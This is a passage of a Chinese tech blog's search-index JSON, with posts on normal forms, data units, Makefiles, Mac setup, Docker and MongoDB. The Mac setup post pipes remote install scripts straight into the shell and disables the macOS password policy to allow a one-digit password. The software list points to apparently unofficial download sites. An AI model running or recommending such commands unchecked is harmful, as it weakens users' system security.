定义\n\n符合3NF，并且，主属性不依赖于主属性。若关系模式R属于第一范式，且每个属性都不传递依赖于键码，则R属于BC范式。\n\n\n\n## 3.5 总结\n\n应用的范式越高，则表越多。表多会带来很多问题：1 查询时要连接多个表，增加了查询的复杂度. 2 查询时需要连接多个表，降低了数据库查询性能\n\n所以有的时候需要应用反范式化\n\n+ 2NF在1NF的基础之上，消除了**非主属性**对于码的部分函数依赖。\n+ 3NF在2NF的基础之上，消除了**非主属性**对于码的传递函数依赖。\n+ BCNF 在3NF的基础上，消除**主属性**对于码的部分与传递函数依赖。\n\n\n\n# 4. 头脑风暴\n\n+ 1NF, 数据库默认就是, 不用考虑\n+ 2NF  码可以决定一切, 但是不能一部分就决定.  (AB->CD) 但是 (A->C)    不能这样, 要改\n+ 3NF  码可以决定一切, 但是不能间接决定.          (A->B->C)  不能这样, 要改\n+ BCNF 码自己的主属性相互依赖,先解决自己的依赖成为 BCNF       (AB->CD)   但是 (A->B) , 要改\n\n\n\n# 5. 参考资料\n\n+ https://www.zhihu.com/question/24696366/answer/29189700\n+ https://www.cnblogs.com/rosesmall/p/9585655.html","tags":["sql"],"categories":["数据库"]},{"title":"文件大小和网速的单位","url":"%2Fp%2F3160c079.html","content":"\n\n\n# 1. 存储单位\n\n计算机发出的信号都是数字形式的，比特(bit)来源于 `binary digit`, 意思是一个二进制数字。一个比特就是二进制数字中的一个1 或 0。我们称为小b。\n\n计算机的数据量常常用字节 B 作为度量的**单位(B代表byte)**，通常一个字节 Byte 代表8个比特。我们称为大B。\n\n> 所以 1 个大B 等于 8 个 小b。\n\n<!-- more -->\n\n### 1.1 文件存储单位\n\n+ K = 2的10次方Byte        **1K = 1024Byte = 1024*8 bit** \n+ M = 2的20次方Byte\n+ G = 2的30次方Byte\n+ T = 2的40次方Byte\n+ .......(1024单位)\n\n\n\n### 1.2 计算机术语\n\n1个字节（8个bit）可以存-128-127，也就是一个8位一共能表示2的8次方，最大能表示255。\n\nint32占4个字节(32个bit)，-2147483648 to 2147483647 ，一共能表示2的32次方。\n\nint64占8个字节(64个bit) : -9223372036854775808 to 9223372036854775807 ， 一共能表示2的64次方。\n\n\n\n### 1.3 1Kb 有多大\n\n我们又常说一个文件多少多少k，其中 1K = 1024Byte = 1024*8 bit。1K字节表示的二进制位数为8192位，一共能表示2的8192次方。\n\n\n\nASCII码：一个英文字母（不分大小写）占一个字节的空间，一个中文汉字占两个字节的空间。\n\n所以1Kb一般能存储1024个字母，或 512 个汉字。\n\n\n\n# 2. 网络速率单位\n\n速率是计算机网络中最重要的一个性能指标,  速率的单位是 `bit/s` | `b/s` |` bps`  (比特每秒)，三个单位一个意思，常见的是 bps。\n\n+ k = 10的3次方  (kbps)        \n\n+ M = 10的6次方 (Mbps)\n+ G = 10的9次方\n+ T = 10的12次方\n+ .......(1000单位)\n\n\n\n### 2.1 存储和速率的计算\n\n15G的数据块以 5G 的速率传送，需要多少时间?    都换算成b（同单位），再进行计算。\n\n解：  15 * 2^30 * 8 比特的数据块  以 5 * 10^9  bps 的速率传送，两个相除就是时间。\n\n = 128849018880/5000000000 = 25.76980378秒\n\n\n\n### 2.2 家庭100Mbps宽带\n\n我们家庭常说的几M带宽（100兆宽带，100Mbps）是以比特为单位的，而我们常看到的下载速度显示的几KB是以字节为单位。\n\n\n\n##### 2.2.1 理论下载速度\n\n100×10^6＝100000000位。因为8个位等于1个字节，所以这个速度每秒可下载100000000位÷8=12500000字节。\n\n12500000字节/1024/1024 ≈ 11.92M。\n\n有的计算方式是直接除以8，是12.5M。\n\n\n\n##### 2.2.2 100兆下载电影\n\n以一个10 G电影为例，下载下来需要多久？\n\n文件换算成M， 10*1024 = 10240M\n\n下载换乘成M， 100/8 =  12.5M\n\n需要多少时间：10240/12.5 = 819.2秒 = 13.65分钟\n\n\n\n# 3. 总结\n\n+ 在计算机领域中, 所有的单位都使用大写字母(K, M, G....)\n\n+ 在通信领域中, 只有1000使用 k, 其余的都用大写(M, G....)\n\n+ 有的不严格区分, 大写的 K 即可以表示1000, 也可以表示1024\n\n\n\n# 4. 参考资料 \n\n+ 计算机网络第7版(谢希仁)","tags":["单位"],"categories":["计算机基础"]},{"title":"makefile的编写规则","url":"%2Fp%2F4cf47ff4.html","content":"\n\n\n### 1. Makefile 介绍\n\nMakefile文件由一系列规则（rules）构成。每条规则的形式如下。\n\n```bash\n<target> : <prerequisites> \n[tab]  <commands>\n```\n\n上面第一行冒号前面的部分，叫做\"目标\"（target），冒号后面的部分叫做\"前置条件\"（prerequisites）；第二行必须由一个tab键起首，后面跟着\"命令\"（commands）。\n\n\"目标\"是必需的，不可省略；\"前置条件\"和\"命令\"都是可选的，但是两者之中必须至少存在一个。\n\n每条规则就明确两件事：构建目标的前置条件是什么，以及如何构建。\n\n<!-- more -->\n\n##### 1.1 目标（target）\n\n一个目标（target）就构成一条规则。目标通常是文件名，指明Make命令所要构建的对象，目标可以是一个文件名，也可以是多个文件名，之间用空格分隔。\n\n除了文件名，目标还可以是某个操作的名字，这称为\"伪目标\"（phony target）。\n\n```makefile\nclean:\n      rm *.o\n```\n\n上面代码的目标是clean，它不是文件名，而是一个操作的名字，属于\"伪目标 \"，作用是删除对象文件。\n\n```bash\n$ make  clean\n```\n\n但是，如果当前目录中，正好有一个文件叫做clean，那么这个命令不会执行。因为Make发现clean文件已经存在，就认为没有必要重新构建了，就不会执行指定的rm命令。\n\n\n\n为了避免这种情况，可以明确声明clean是\"伪目标\"，写法如下。\n\n```makefile\n.PHONY: clean\nclean:\n        rm *.o temp\n```\n\n\n\n声明clean是\"伪目标\"之后，make就不会去检查是否存在一个叫做clean的文件，而是每次运行都执行对应的命令。\n\n\n\n如果Make命令运行时没有指定目标，默认会执行Makefile文件的第一个目标。\n\n```bash\nmake\n```\n\n\n\n##### 1.2 前置条件（prerequisites）\n\n前置条件通常是一组文件名，之间用空格分隔。它指定了\"目标\"是否重新构建的判断标准：只要有一个前置文件不存在，或者有过更新（前置文件的last-modification时间戳比目标的时间戳新），\"目标\"就需要重新构建。\n\n```makefile\nresult.txt: source.txt\n    cp source.txt result.txt\n```\n\n上面代码中，构建 result.txt 的前置条件是 source.txt 。如果当前目录中，source.txt 已经存在，那么`make result.txt`可以正常运行，否则必须再写一条规则，来生成 source.txt 。\n\n```makefile\nsource.txt:\n    echo \"this is the source\" > source.txt\n```\n\n\n\n上面代码中，source.txt后面没有前置条件，就意味着它跟其他文件都无关，只要这个文件还不存在，每次调用`make source.txt`，它都会生成。\n\n```bash\n$ make result.txt\n$ make result.txt\n```\n\n上面命令连续执行两次`make result.txt`。第一次执行会先新建 source.txt，然后再新建 result.txt。第二次执行，Make发现 source.txt 没有变动（时间戳晚于 result.txt），就不会执行任何操作，result.txt 也不会重新生成。\n\n##### 1.3 命令（commands）\n\n命令（commands）表示如何更新目标文件，由一行或多行的Shell命令组成。它是构建\"目标\"的具体指令，它的运行结果通常就是生成目标文件。\n\n每行命令之前必须有一个tab键。需要注意的是，每行命令在一个单独的shell中执行。这些Shell之间没有继承关系。\n\n```makefile\nvar-lost:\n    export foo=bar\n    echo \"foo=[$$foo]\"\n```\n\n上面代码执行后（`make var-lost`），取不到foo的值。因为两行命令在两个不同的进程执行。一个解决办法是将两行命令写在一行，中间用分号分隔。\n\n```makefile\nvar-kept:\n    export foo=bar; echo \"foo=[$$foo]\"\n```\n\n另一个解决办法是在换行符前加反斜杠转义。\n\n```makefile\nvar-kept:\n    export foo=bar; \\\n    echo \"foo=[$$foo]\"\n```\n\n\n\n\n\n### 2. Makefile文件的语法\n\n\n\n##### 2.1 井号（#）\n\n在Makefile中表示注释。\n\n\n\n##### 2.2 回声（echoing）\n\n正常情况下，make会打印每条命令，然后再执行，这就叫做回声（echoing）。\n\n在命令的前面加上@，就可以关闭回声。\n\n```makefile\ntest:\n    # 这是测试\n\ntest:\n    @# 这是测试\n```\n\n\n\n##### 2.3 通配符\n\n通配符（wildcard）用来指定一组符合条件的文件名。Makefile 的通配符与 Bash 一致，主要有星号（*）、问号（？）和 [...] 。比如， *.o 表示所有后缀名为o的文件。\n\n```makefile\nclean:\n        rm -f *.o\n```\n\n\n\n##### 2.4 模式匹配\n\nMake命令允许对文件名，进行类似正则运算的匹配，主要用到的匹配符是%。比如，假定当前目录下有 f1.c 和 f2.c 两个源码文件，需要将它们编译为对应的对象文件。\n\n```\n%.o: %.c\n\n等同于下面的写法。\n\nf1.o: f1.c\nf2.o: f2.c\n```\n\n使用匹配符%，可以将大量同类型的文件，只用一条规则就完成构建。\n\n\n\n##### 2.5 变量和赋值符\n\nMakefile 允许使用等号自定义变量。\n\n```makefile\ntxt = Hello World\ntest:\n    @echo $(txt)\n```\n\n上面代码中，变量 txt 等于 Hello World。调用时，变量需要放在 $( ) 之中。\n\n\n\n调用Shell变量，需要在美元符号前，再加一个美元符号，这是因为Make命令会对美元符号转义。\n\n```makefile\ntest:\n    @echo $$HOME\n```\n\n\n\n有时，变量的值可能指向另一个变量。\n\n```makefile\nv1 = $(v2)\n```\n\n上面代码中，变量 v1 的值是另一个变量 v2。这时会产生一个问题，v1 的值到底在定义时扩展（静态扩展），还是在运行时扩展（动态扩展）？如果 v2 的值是动态的，这两种扩展方式的结果可能会差异很大。\n\n为了解决类似问题，Makefile一共提供了四个赋值运算符 （=、:=、？=、+=），它们的区别请看[StackOverflow](http://stackoverflow.com/questions/448910/makefile-variable-assignment)。\n\n```bash\nVARIABLE = value\n# 在执行时扩展，允许递归扩展。\n\nVARIABLE := value\n# 在定义时扩展。\n\nVARIABLE ?= value\n# 只有在该变量为空时才设置值。\n\nVARIABLE += value\n# 将值追加到变量的尾端。\n```\n\n\n\n##### 2.6 内置变量（Implicit Variables）\n\nMake命令提供一系列内置变量，比如，`$(CC)` 指向当前使用的编译器，`$(MAKE)` 指向当前使用的Make工具。这主要是为了跨平台的兼容性，详细的内置变量清单见[手册](https://www.gnu.org/software/make/manual/html_node/Implicit-Variables.html)。\n\n```makefile\noutput:\n    $(CC) -o output input.c\n```\n\n\n\n##### 2.7 自动变量（Automatic Variables）\n\nMake命令还提供一些自动变量，它们的值与当前规则有关。主要有以下几个。\n\n+ ``$@``\n\n  `$@`指代当前目标，就是Make命令当前构建的那个目标。比如，`make foo`的`$@` 就指代foo。\n\n  ```bash\n  a.txt b.txt: \n      touch $@\n      \n  #等同于下面的写法。    \n   \n  a.txt:\n      touch a.txt\n  b.txt:\n      touch b.txt\n  ```\n\n+ `$<`\n\n  `$<` 指代第一个前置条件。比如，规则为 t: p1 p2，那么`$<` 就指代p1。\n\n  ```bash\n  a.txt: b.txt c.txt\n      cp $< $@ \n      \n  # 等同于下面的写法。\n  \n  a.txt: b.txt c.txt\n      cp b.txt a.txt \n  ```\n\n  \n\n+ `$?`\n\n  `$?` 指代比目标更新的所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，其中 p2 的时间戳比 t 新，`$?`就指代p2。\n\n  \n\n+ `$^`\n\n  `$^` 指代所有前置条件，之间以空格分隔。比如，规则为 t: p1 p2，那么 `$^` 就指代 p1 p2 。\n\n  \n\n+ `$*`\n\n  `$*` 指代匹配符 % 匹配的部分， 比如% 匹配 f1.txt 中的f1 ，`$*` 就表示 f1。\n\n  \n\n+ `$(@D)` 和 `$(@F)`\n\n  `$(@D)` 和 `$(@F)` 分别指向 `$@` 的目录名和文件名。比如，`$@`是 src/input.c，那么`$(@D)` 的值为 src ，`$(@F)` 的值为 input.c。\n\n  \n\n+ `$(<D)` 和 `$(<F)`\n\n  `$(<D)` 和 `$(<F)` 分别指向 `$<` 的目录名和文件名。\n\n\n\n下面是自动变量的一个例子。\n\n```makefile\ndest/%.txt: src/%.txt\n    @[ -d dest ] || mkdir dest\n    cp $< $@\n```\n\n上面代码将 src 目录下的 txt 文件，拷贝到 dest 目录下。首先判断 dest 目录是否存在，如果不存在就新建，然后，`$<` 指代前置文件（src/%.txt）， `$@` 指代目标文件（dest/%.txt）。\n\n\n\n##### 2.8 判断和循环\n\nMakefile使用 Bash 语法，完成判断和循环。\n\n```makefile\nifeq ($(CC),gcc)\n  libs=$(libs_for_gcc)\nelse\n  libs=$(normal_libs)\nendif\n```\n\n上面代码判断当前编译器是否 gcc ，然后指定不同的库文件。\n\n\n\n```makefile\nLIST = one two three\nall:\n    for i in $(LIST); do \\\n        echo $$i; \\\n    done\n\n# 等同于\n\nall:\n    for i in one two three; do \\\n        echo $i; \\\n    done\n```\n\n上面代码的运行结果。\n\n```bash\none\ntwo\nthree\n```\n\n\n\n##### 2.9 函数\n\nMakefile 还可以使用函数，格式如下。\n\n```bash\n$(function arguments)\n# 或者\n${function arguments}\n```\n\n\n\nMakefile提供了许多[内置函数](http://www.gnu.org/software/make/manual/html_node/Functions.html)，可供调用。下面是几个常用的内置函数。\n\n+ shell 函数\n\n  shell 函数用来执行 shell 命令\n\n  ```makefile\n  srcfiles := $(shell echo src/{00..99}.txt)\n  ```\n\n  \n\n+ wildcard 函数\n\n  wildcard 函数用来在 Makefile 中，替换 Bash 的通配符。\n\n  ```makefile\n  srcfiles := $(wildcard src/*.txt)\n  ```\n\n  \n\n+ subst 函数\n\n  subst 函数用来文本替换，格式如下。\n\n  ```makefile\n  $(subst from,to,text)\n  ```\n\n  下面的例子将字符串\"feet on the street\"替换成\"fEEt on the strEEt\"。\n\n  ```makefile\n  $(subst ee,EE,feet on the street)\n  ```\n\n  \n\n+ patsubst函数\n\n  patsubst 函数用于模式匹配的替换，格式如下。\n\n  ```makefile\n  $(patsubst pattern,replacement,text)\n  ```\n\n  下面的例子将文件名\"x.c.c bar.c\"，替换成\"x.c.o bar.o\"。\n\n  ```makefile\n  $(patsubst %.c,%.o,x.c.c bar.c)\n  ```\n\n  \n\n+ 替换后缀名\n\n  替换后缀名函数的写法是：变量名 + 冒号 + 后缀名替换规则。它实际上patsubst函数的一种简写形式。\n\n  ```makefile\n  min: $(OUTPUT:.js=.min.js)\n  ```\n\n  上面代码的意思是，将变量OUTPUT中的后缀名 .js 全部替换成 .min.js 。\n\n\n\n### 3. Makefile 的实例\n\n##### 3.1  删除\n\n```makefile\n.PHONY: cleanall cleanobj cleandiff\n\ncleanall : cleanobj cleandiff\n        rm program\n\ncleanobj :\n        rm *.o\n\ncleandiff :\n        rm *.diff\n```\n\n上面代码可以调用不同目标，删除不同后缀名的文件，也可以调用一个目标（cleanall），删除所有指定类型的文件。\n\n##### 3.2 编译C语言项目\n\n```makefile\nedit : main.o kbd.o command.o display.o \n    cc -o edit main.o kbd.o command.o display.o\n\nmain.o : main.c defs.h\n    cc -c main.c\nkbd.o : kbd.c defs.h command.h\n    cc -c kbd.c\ncommand.o : command.c defs.h command.h\n    cc -c command.c\ndisplay.o : display.c defs.h\n    cc -c display.c\n\nclean :\n     rm edit main.o kbd.o command.o display.o\n\n.PHONY: edit clean\n```\n\n\n\n##### 3.3 项目\n\n```makefile\n.SILENT :\n.PHONY : dep vet clean dist package test\n\nNAME := cistern\nPRE := oc\nROOF := fhyx.tech/oceans/$(NAME)\n\nWITH_ENV = env `cat .env 2>/dev/null | xargs`\nUNAME_S := $(shell uname -s)\nifeq ($(UNAME_S),Darwin)\n    HOST := $(shell scutil --get LocalHostName)\nelse\n    HOST := $(shell hostname)\nendif\n\nDATE := $(shell date '+%Y%m%dT%H%M')\nSTAMP := $(shell date +%s)\nUSER := $(shell echo ${USER})\nTAG:=$(shell git describe --tags --always)\nLDFLAGS:=-X $(ROOF)/settings.Name=$(NAME) -X $(ROOF)/cmd.version=$(TAG) -X $(ROOF)/cmd.built=$(DATE) -X $(ROOF)/cmd.buildStamp=$(STAMP) -X $(ROOF)/cmd.buildUser=$(USER) -X $(ROOF)/cmd.buildHost=$(HOST)\n\nCOMMANDS = vet clean dist\n.PHONY: $(COMMANDS)\n\nmain:\n\techo \"Building $(NAME)\"\n\tgo build -ldflags \"$(LDFLAGS)\" .\n\nhelp:\n\t@echo \"commands: $(COMMANDS)\"\n\nall: clean $(COMMANDS)\n\nvet:\n\techo \"Checking .\"\n\tgo vet -vettool=$(which shadow) -atomic -bool -copylocks -nilfunc -printf -rangeloops -unreachable -unsafeptr -unusedresult ./...\n\nclean:\n\techo \"Cleaning dist\"\n\trm -rf dist\n\trm -f $(NAME) $(NAME)-*\n\ndist/linux_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of linux\"\n\tmkdir -p dist/linux_amd64 && GOOS=linux GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -s -w\" -o dist/linux_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist/darwin_amd64/$(NAME): $(SOURCES)\n\techo \"Building $(NAME) of darwin\"\n\tmkdir -p dist/darwin_amd64 && GOOS=darwin GOARCH=amd64 go build -ldflags \"$(LDFLAGS) -w\" -o dist/darwin_amd64/$(PRE)-$(NAME) $(ROOF)\n\ndist: clean dist/linux_amd64/$(NAME) dist/darwin_amd64/$(NAME)\n\npackage: dist\n\techo \"Packaging $(NAME)\"\n\tls dist/linux_amd64 | xargs tar -cvJf $(NAME)-linux-amd64-$(TAG).tar.xz -C dist/linux_amd64\n\n.PHONY: binary-deploy\nbinary-deploy:\n\t@echo \"copy binary to earth\"\n\t@scp dist/linux_amd64/??-* earth:dist/linux_amd64/\n\n.PHONY: package-upload\npackage-upload:\n\t@echo \"copy package.tar.?z to venus\"\n\t@scp *-linux-amd64-*.tar.?z gopkg:/var/www/gopkg/\n\ndocker-build: dist/linux_amd64/$(NAME)\n\techo \"Building docker image\"\n\tcp -rf Dockerfile* dist/\n\tdocker build -t fhyx/cistern:$(TAG) dist/\n\tdocker tag fhyx/cistern:$(TAG) fhyx/cistern:latest\n.PHONY: $@\n```\n\n\n\n```go\npackage cmd\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\n\t\"github.com/spf13/cobra\"\n)\n\nvar (\n\tversion   = \"dev\"\n\tbuilt     = \"N/A\"\n\tbuildUser = \"None\"\n\tname      = \"cistern\"\n)\n\nvar versionCmd = &cobra.Command{\n\tUse:   \"version\",\n\tShort: \"Print the version number\",\n\tLong:  ``,\n\tRun: func(cmd *cobra.Command, args []string) {\n\t\tfmt.Printf(\"%s %s built %s by %s (%s %s-%s)\\n\", name, version, built, buildUser, runtime.Version(), runtime.GOOS, runtime.GOARCH)\n\t},\n}\n\nfunc init() {\n\tRootCmd.AddCommand(versionCmd)\n}\n\nfunc inDevelop() bool {\n\treturn version == \"dev\"\n}\n```\n\n\n\n### 4. 参考资料\n\n+ http://www.ruanyifeng.com/blog/2015/02/make.html\n+ https://blog.csdn.net/ruglcc/article/details/7814546\n+ http://www.gnu.org/software/make/manual/html_node/Special-Targets.html#Special-Targets\n","tags":["makefile"],"categories":["系统"]},{"title":"mac装机操作配置","url":"%2Fp%2Fa6af54c5.html","content":"\n记录一下常用的mac操作配置。\n\n<!-- more -->\n\n# 1. 操作\n\n### 1.1 触发角\n\n<img src=\"mac装机操作配置/1.jpeg\" alt=\"1\" style=\"zoom:70%;\" />\n\n### 1.2 密码修改为1位数\n\n```bash\npwpolicy -clearaccountpolicies\n```\n\n然后去系统偏好设置->用户与群组->修改密码\n\n### 1.3  显示隐藏文件\n\n```bash\ndefaults write com.apple.finder AppleShowAllFiles -boolean true ; killall Finder\n```\n\n### 1.4 固定F1-F12\n\n系统偏好设置->键盘->触控栏显示\n\n### 1.5 最小化程序到应用图标\n\n系统偏好设置->Dock->Mini windows into application icon\n\n### 1.6 访达配置\n\n<img src=\"mac%E8%A3%85%E6%9C%BA%E6%93%8D%E4%BD%9C%E9%85%8D%E7%BD%AE/iShot_2022-06-25_15.16.46.png\" alt=\"iShot_2022-06-25_15.16.46\" style=\"zoom:87%;\" />\n\n# 2. 配置\n\n### 2.1 前置软件\n\n+ 下载dropbox和typora\n\n<img src=\"mac%E8%A3%85%E6%9C%BA%E6%93%8D%E4%BD%9C%E9%85%8D%E7%BD%AE/image-20220108155908753.png\" style=\"zoom:50%;\" />\n\n+ 设置git\n\n```bash\ngit config --global core.quotepath false\ngit config --global pull.rebase false\n\ngit config --global alias.lg \"log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit\"\n\ngit config --global user.name \"unix2dos\"\ngit config --global user.email levonfly@gmail.com\n\ngit config --global user.name \"liuwei\"\ngit config --global user.email liuwei@funlink-tech.com\n```\n\n\n\n### 2.2 ssh配置\n\n```bash\nln -s ~/Dropbox/_多重备份_/5\\ LevonConfig/Config/ssh  ~/.ssh\n\nsudo chmod 755 ~/.ssh\nsudo chmod 600 ~/.ssh/*\nsudo chown $USER ~/.ssh/*\n```\n\n\n\n### 2.3 下载仓库\n\n```bash\ncd && mkdir workspace && cd workspace\n\ngit clone git@github.com:unix2dos/LevonConfig.git\ngit clone git@github.com:unix2dos/unix2dos.github.io.git\ngit clone git@github.com:unix2dos/dohttp.git\n```\n\n\n\n### 2.4 vim插件\n\n  ```bash\nln -s ~/Dropbox/_多重备份_/5\\ LevonConfig/Config/vim/.vimrc ~/.vimrc\n\ncurl -fLo ~/.vim/autoload/plug.vim --create-dirs \\\n    https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim\n\n# 进入vim\n:PlugInstall\n  ```\n\n\n\n### 2.5 zsh+tmux\n\n+ 下载Alacritty\n\n+ 安装brew\n\n  ```bash\n  /bin/zsh -c \"$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)\"\n  ```\n\n+ 安装zsh + tmux\n\n  ```bash\n  # 安装ohzsh\n  sh -c \"$(curl -fsSL https://raw.githubusercontent.com/ohmyzsh/ohmyzsh/master/tools/install.sh)\"\n  \n  git clone --depth=1 https://github.com/romkatv/powerlevel10k.git ${ZSH_CUSTOM:-$HOME/.oh-my-zsh/custom}/themes/powerlevel10k\n  \n  git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions\n  git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting\n  \n  # 下载安装特殊字体\n  https://github.com/romkatv/powerlevel10k#meslo-nerd-font-patched-for-powerlevel10k \n  \n  # 安装tmux\n  brew install tmux\n  cd ~ && git clone https://github.com/gpakosz/.tmux.git\n  ln -s -f .tmux/.tmux.conf\n  \n  ```\n\n+ 配置\n\n  ```bash\n  ln -s ~/Dropbox/_多重备份_/5\\ LevonConfig/Config/zsh/.zshrc ~/.zshrc\n  ln -s ~/Dropbox/_多重备份_/5\\ LevonConfig/Config/tmux/.tmux.conf.local ~/.tmux.conf.local\n  ln -s ~/Dropbox/_多重备份_/5\\ LevonConfig/Config/alacritty/.alacritty.yml ~/.alacritty.yml\n  \n  tmux source-file ~/.tmux.conf\n  ```\n  \n    \n\n# 3. 软件\n\n### 3.1 rm 删除到垃圾桶\n\n```bash\nbrew install trash\nalias rm=trash  # 建议放到.zshrc里\n```\n\n","tags":["mac"],"categories":["使用"]},{"title":"mac常用软件","url":"%2Fp%2F2e385ebc.html","content":"\n记录一下常用的mac软件。\n\n<!-- more -->\n\n# 1. 系统\n\n+ f.lux 保护视力\n\n  https://justgetflux.com/\n\n  \n\n+ Bob  英语翻译\n\n  已购买付费，去appstore下载。\n\n  \n\n+ iShot 长截图\n\n  已购买付费，去appstore下载。\n\n  \n\n+ moom 多窗口管理 \n\n  https://www.macwk.com/soft/moom\n\n  \n\n+ TotalFinder 加强finder\n\n  https://totalfinder.binaryage.com/\n\n  \n\n+ Alfred 效率软件\n\n  https://www.macwk.com/soft/alfred-4\n\n  \n\n+ Stretchly 提醒软件\n\n  https://github.com/hovancik/stretchly/releases\n\n\n\n# 2. 记录\n\n+ 有道云笔记，mac下载历史版本V3.6.5\n\n  https://note.youdao.com/download.html\n\n  \n\n+ Typora markdown编辑器\n\n  https://www.macwk.com/soft/typora\n\n  \n\n+ Microsoft To Do\n\n  去appstore下载。\n\n  \n\n+ XMind 脑图\n\n  https://www.macwk.com/soft/xmind\n\n  \n\n+ Anki  记忆神器，mac免费，ios付费。\n\n  https://apps.ankiweb.net/\n\n  \n\n+ ClearviewX 电子书阅读\n\n  https://www.macwk.com/soft/clearview-x\n\n\n\n# 3. 文件\n\n+ Dropbox 最牛批的网盘\n\n  https://www.dropbox.com/install\n\n  \n\n+ Duplicate File Finder Pro 重复文件查找\n\n  https://www.macwk.com/soft/duplicate-file-finder-pro\n\n  \n\n+ A Better Finder Rename 批量重命名文件名\n\n  https://www.macwk.com/soft/a-better-finder-rename\n\n  \n\n+ Hazel 整理问题神器\n\n  https://www.macwk.com/soft/hazel\n\n  \n\n+ Imagine 批量压缩图片\n\n  https://github.com/meowtec/Imagine/releases\n\n  \n\n+ PhotoBulk 批量修改图片尺寸，加水印\n\n  https://www.macwk.com/soft/photobulk\n\n\n\n# 4. 程序\n\n+ Alacritty  \n\n  https://github.com/alacritty/alacritty/releases\n\n  \n\n+ ClashX Pro 代理\n\n  https://install.appcenter.ms/users/clashx/apps/clashx-pro/distribution_groups/public\n\n  \n\n+ Navicat Premium 数据库client\n\n  https://www.macwk.com/soft/navicat-premium\n\n  \n\n+ Another Redis Desktop Manager Redis client\n\n  https://github.com/qishibo/AnotherRedisDesktopManager/releases\n\n\n\n# 10. 参考资料\n\n+ https://www.zhihu.com/question/20432364/answer/660754448\n","tags":["mac"],"categories":["软件"]},{"title":"docker中使用mongodb","url":"%2Fp%2F6fa8633a.html","content":"\n### 1. 安装\n\n##### 1.1 安装 mongodb\n\n```bash\nmkdir ~/data\n\nsudo docker pull mongo:latest \n\n# 一定要把数据卷暴露出去, 这样方便数据迁移\nsudo docker run -d -p 27017:27017 --name mongo -v /home/liuwei/data:/data/db mongo:latest\n\nsudo docker exec -it mongo mongo\n```\n\n<!-- more -->\n\n\n\n##### 1.2 将数据迁移到新容器\n\nLet's start a new MongoDB container, this time running on port 37017 instead of the default 27017:\n\n```bash\n# Copy the data from the previous container \nsudo cp -r ~/data ~/data_clone  \n\n# Start another MongoDB container \nsudo docker run -d -p 37017:27017 -v ~/data_clone:/data/db mongo\n```\n\n\n\n### 2. 使用\n\n```sql\ndb.createCollection('cities') \ndb.cities.insert({ name: 'New York', country: 'USA' }) \ndb.cities.insert({ name: 'Paris', country: 'France' }) \ndb.cities.find()\n```\n\n\n\n### 3. 参考资料\n\n+ https://www.thachmai.info/2015/04/30/running-mongodb-container/\n\n+ docker-compose 使用mongodb 参考 {% post_link 2-linux系统/docker/docker-compose的一次实践 %}\n\n","tags":["mongodb"],"categories":["docker"]},{"title":"docker-compose的一次实践","url":"%2Fp%2F331c471e.html","content":"\n\n\n### 0. 前言\n\nDocker Compose 是 Docker 官方编排（Orchestration）项目之一，负责快速的部署分布式应用，它是由 `python` 编写。\n\n`Compose` 定位是定义和运行多个 Docker 容器的应用。`Compose` 有两个重点\n\n- `docker-compose.yml` `compose` 配置文件\n- `docker-compose` 命令行工具\n\n<!-- more -->\n\n### 1. 安装\n\nwindows 和 mac 中 `docker-compose` 在安装 `docker` 的时候就已经捆绑安装了。linux 中需要自己安装\n\n\n```bash\n# 版本可以去 github 查看最新的版本\nsudo curl -L \"https://github.com/docker/compose/releases/download/1.24.1/docker-compose-(uname -s)-(uname -m)\" -o /usr/local/bin/docker-compose \n\n\nsudo chmod +x /usr/local/bin/docker-compose \n\ndocker-compose --version\n```\n\n\n\n### 2. 使用\n\n```bash\ndocker-compose up # 启动\ndocker-compose down # 关闭\n```\n\n> docker-compose.yml\n\n```yml\nversion: '3' # 定义版本，不指定默认为版本 1，新版本功能更多\n\n\nservices:\n\n  mongo4:\n    image: mongo:4\n    privileged: true\n    restart: unless-stopped\n    volumes:  \n      - $HOME/transcode/data/db/:/data/db/\n      - ./mongo/mongo-init.js:/docker-entrypoint-initdb.d/mongo-init.js:ro\n    container_name: mongo4\n    environment:\n      MONGO_INITDB_ROOT_USERNAME: yx1\n      MONGO_INITDB_ROOT_PASSWORD: test\n      MONGO_INITDB_DATABASE: transcode_v1\n    network_mode: bridge # 加上不会创建默认的桥, 即有一个为空, 就会创建一个默认 network\n    ports: # 暴露端口信息\n      - \"47047:27017\"\n\n\n\n  transcode-service:\n    build: service # 指定 Dockerfile 所在文件夹的路径\n    privileged: true # 允许容器中运行一些特权命令\n    restart: unless-stopped\n    volumes:\n     - /var/lib/oceans/:/var/lib/oceans/\n    container_name: transcode-service\n    network_mode: host\n\n\n  transcode-webapi:\n    build: webapi\n    privileged: true\n    restart: unless-stopped\n    container_name: transcode-webapi\n    network_mode: host\n```\n\n\n\n然后在 webapi, service 文件夹内创建各自的 dockerfile 文件\n\n\n\n\n> ./mongo/mongo-init.js\n\n```javascript\ndb.createUser(\n    {\n        user: \"yx1\",\n        pwd: \"test\",\n        roles:[\n            {\n                role: \"readWrite\",\n                db:   \"transcode_v1\"\n            }\n        ]\n    }\n);\n```\n\n\n\n##### 2.1 默认网桥问题\n\ndocker-compose 启动后会自动创建一个网桥, 如果不想创建, 即每个容器都写上值, 不能为空\n\n```yaml\nnetwork_mode: bridge\n```\n\n参考: https://stackoverflow.com/a/43755216\n\n\n\n##### 2.2 mongo 启动后自动创建用户\n\n参考: https://stackoverflow.com/a/54064268\n\n\n\n### 3. 参考资料\n\n+ https://yeasy.gitbooks.io/docker_practice/compose/\n+ https://juejin.im/post/5d17442e518825559f46ed92","tags":["docker-compose"],"categories":["docker"]},{"title":"curl命令的使用总结","url":"%2Fp%2Fda64728.html","content":"\n[curl](http://curl.haxx.se/)是一种命令行工具，作用是发出网络请求，然后得到和提取数据，显示在\"标准输出\"（stdout）上面。\n\n### 1. 